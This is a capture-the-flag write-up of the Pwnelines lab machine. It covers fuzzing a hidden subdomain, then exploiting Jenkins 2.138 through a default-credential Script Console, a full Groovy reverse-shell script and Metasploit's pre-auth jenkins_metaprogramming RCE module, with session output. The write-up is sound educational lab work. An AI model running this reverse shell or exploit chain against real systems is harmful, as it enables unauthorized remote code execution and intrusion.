# Pwnelines — Aclabs.pro

![](https://img.shields.io/badge/Platform-ACLabs.rpo-blue?style=for-the-badge)
![](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![](https://img.shields.io/badge/OS-Linux-informational?style=for-the-badge&logo=linux&logoColor=white)
![](https://img.shields.io/badge/Category-Web%20%7C%20Jenkins-orange?style=for-the-badge)

## Summary
<img width="1919" height="846" alt="Pwnelines_aclabs pro" src="https://github.com/user-attachments/assets/219e6854-35fc-4bce-8f5f-41edd32138a7" />


Pwnelines is an **Easy**-rated Linux machine that runs a web server on port 80 and exposes a Jenkins 2.138 instance on port 50000. The attack chain boils down to three steps: discovering a hidden `jenk` subdomain via fuzzing, reaching the Jenkins dashboard behind it, and exploiting an ACL Bypass + Metaprogramming RCE (no authentication required) to get code execution inside a Docker container where the flag lives.

Rated Easy — yet only **2 out of all participants** solved it during the live CTF. The culprit? A subdomain that refuses to show up in the usual wordlists, and a Metasploit timing quirk that silently kills sessions if you don't adjust `WfsDelay`. Let's break it down.

```
Recon → Subdomain Fuzzing → Jenkins Discovery → ACL Bypass RCE → Flag
```

## Reconnaissance

### Nmap

Starting with a standard service scan:

```bash
nmap -sC -sV -p- $IP
```

```
PORT      STATE SERVICE VERSION
80/tcp    open  http    nginx
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://pwnelines.acl/
50000/tcp open  http    Jenkins httpd 2.138
|_http-server-header: 172.18.0.2
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
| http-methods:
|_  Supported Methods: GET
```

Two things stand out immediately:

- **Port 80** — an nginx web server redirecting to `http://pwnelines.acl/` (added to `/etc/hosts`).
- **Port 50000** — a Jenkins 2.138 instance with an internal IP header (`172.18.0.2`), strongly suggesting a Docker container.

### Web Enumeration

Browsing `http://pwnelines.acl/` reveals a static landing page — no forms, no dynamic content, nothing of interest in the source code. A dead end.
<img width="1919" height="884" alt="pwnelines_web" src="https://github.com/user-attachments/assets/b816f035-9124-44a7-b577-fd92e38b4ec6" />


Navigating to port 50000 directly returns a plain-text response confirming the internal container IP. Jenkins is clearly running behind this host, but we can't reach the dashboard from here yet.

<img width="695" height="203" alt="pwnelines:50000" src="https://github.com/user-attachments/assets/375271b3-a883-4f84-b80e-2945479eb58e" />


Jenkins 2.138 has a healthy list of known CVEs, but none of them matter until we can actually reach the Jenkins web interface. Time to fuzz.

## Subdomain Fuzzing

### Attempt 1 — Standard Subdomain Wordlist

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
     -u http://$IP/ \
     -H "Host: FUZZ.pwnelines.acl" \
     -ic -c
```

```
www                     [Status: 200, Size: 23689, Words: 9471, Lines: 674, Duration: 101ms]
:: Progress: [114438/114438] :: Job [1/1] :: 409 req/sec :: Duration: [0:04:50] :: Errors: 0 ::
```

Almost 5 minutes of scanning and only `www`. This is likely why most participants gave up here — the standard SecLists DNS wordlist simply doesn't contain the subdomain we need.

### Attempt 2 — DirBuster Big Wordlist

Switching to a much larger, general-purpose wordlist and filtering out the default redirect size:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
     -u http://$IP/ \
     -H "Host: FUZZ.pwnelines.acl" \
     -ic -c -fs 162
```

```
www                     [Status: 200, Size: 23689, Words: 9471, Lines: 674, Duration: 107ms]
WWW                     [Status: 200, Size: 23689, Words: 9471, Lines: 674, Duration: 94ms]
jenk                    [Status: 200, Size: 10310, Words: 466, Lines: 17, Duration: 1283ms]
```

There it is — **`jenk`**. A truncated, non-obvious subdomain that doesn't appear in typical subdomain dictionaries. This is the bottleneck that stopped most competitors dead in their tracks.

> **Key takeaway:** Don't limit subdomain fuzzing to DNS-specific wordlists. General-purpose directory wordlists (like DirBuster's big list) can catch unconventional subdomains that DNS lists miss entirely.

After adding `jenk.pwnelines.acl` to `/etc/hosts`, we can proceed.

## Exploitation

### Jenkins Dashboard

<img width="1919" height="885" alt="pwnelines_jenkins" src="https://github.com/user-attachments/assets/84c2344f-f622-44c6-ab0f-a9928f078ad5" />


Navigating to `http://jenk.pwnelines.acl/` drops us straight into the Jenkins admin panel.

**Quick win path (if default credentials work):** `admin:admin` grants full access to the Script Console, where a Groovy one-liner reads the flag directly:

```groovy
new File('/home/user/flag').text
```

Alternatively, a Groovy reverse shell via the Script Console (start a listener with `nc -vlnp 4444` first):

```groovy
String host="YOUR_IP";int port=4444;String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0)so.write(pi.read());
  while(pe.available()>0)so.write(pe.read());
  while(si.available()>0)po.write(si.read());
  so.flush();po.flush();Thread.sleep(50);
  try{p.exitValue();break;}catch(Exception e){}
};
p.destroy();s.close();
```

However, if default credentials don't work, we need an unauthenticated approach.

### Metasploit — Jenkins ACL Bypass and Metaprogramming RCE

Reference: [Hacking Jenkins Part 1 — Play with Dynamic Routing (Orange Tsai)](https://blog.orange.tw/posts/2019-01-hacking-jenkins-part-1-play-with-dynamic-routing/)

The `exploit/multi/http/jenkins_metaprogramming` module exploits a pre-auth ACL bypass in Jenkins, making it perfect for this scenario.

#### Initial Configuration

```bash
msf6> use exploit/multi/http/jenkins_metaprogramming
msf6 exploit(multi/http/jenkins_metaprogramming)> set rhosts 10.10.10.210
msf6 exploit(multi/http/jenkins_metaprogramming)> set rport 80
msf6 exploit(multi/http/jenkins_metaprogramming)> set lhost tun0
msf6 exploit(multi/http/jenkins_metaprogramming)> set vhost jenk.pwnelines.acl
msf6 exploit(multi/http/jenkins_metaprogramming)> set payload java/meterpreter/reverse_tcp
msf6 exploit(multi/http/jenkins_metaprogramming)> set ForceExploit true
```

> **Note:** The default payload fails to establish a session. Switching to `java/meterpreter/reverse_tcp` is required since the target is a Java-based Jenkins container.

#### The WfsDelay Trap

Running the exploit with default settings results in:

```
[*] Exploit completed, but no session was created.
```

The issue lies in the `WfsDelay` (Wait For Session Delay) setting. The default value of **2 seconds** is far too short for the target's response time — the payload gets delivered but the handler gives up before the session connects back.

```bash
msf6 exploit(multi/http/jenkins_metaprogramming)> set wfsdelay 60
```

This is almost certainly the **second reason** most participants failed — even those who found the subdomain. Metasploit silently abandons the session with no error message indicating a timeout issue. You'd only catch it by checking advanced options or having prior experience with slow targets.

#### Successful Exploitation

```bash
msf6 exploit(multi/http/jenkins_metaprogramming)> run

[*] Started reverse TCP handler on 10.20.10.2:4444
[*] Jenkins 2.138 detected
[-] Jenkins 2.138 is not a supported target
[!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
[*] Configuring Java Dropper target
[*] Using URL: http://10.20.10.2:8080/
[*] Sending Jenkins and Groovy go-go-gadgets
[+] Sending payload JAR
[*] Sending stage (58073 bytes) to 10.10.10.210
[*] Meterpreter session 1 opened (10.20.10.2:4444 -> 10.10.10.210:58420)
```

We land inside a Docker container (confirmed by the presence of `.dockerenv` in the filesystem root).

## Flag

```bash
meterpreter> cat /flag
flag_f24f91078b3fca0a0b80f28ba4b9f67d
```

> Flags are dynamically generated per user — copying this one won't do you any good.

## Lessons Learned

1. **Wordlist selection matters.** The standard DNS subdomain wordlists missed `jenk` entirely. Using a general-purpose directory brute-force list (`DirBuster-2007`) for virtual host fuzzing was the key to finding it. When in doubt — try multiple wordlists.

2. **Metasploit's `WfsDelay` is a silent killer.** The default 2-second timeout is woefully inadequate for targets with any network latency or processing delay. If an exploit delivers the payload successfully but fails to open a session, bumping `WfsDelay` to 30–60 seconds should be your first troubleshooting step.

3. **ForceExploit exists for a reason.** Metasploit flagged Jenkins 2.138 as "not a supported target," but the exploit worked perfectly. Version checks in modules aren't always comprehensive — if the vulnerability logically applies, `ForceExploit true` is worth trying.

---

*Writeup by [@alfabuster](https://github.com/alfabuster)*
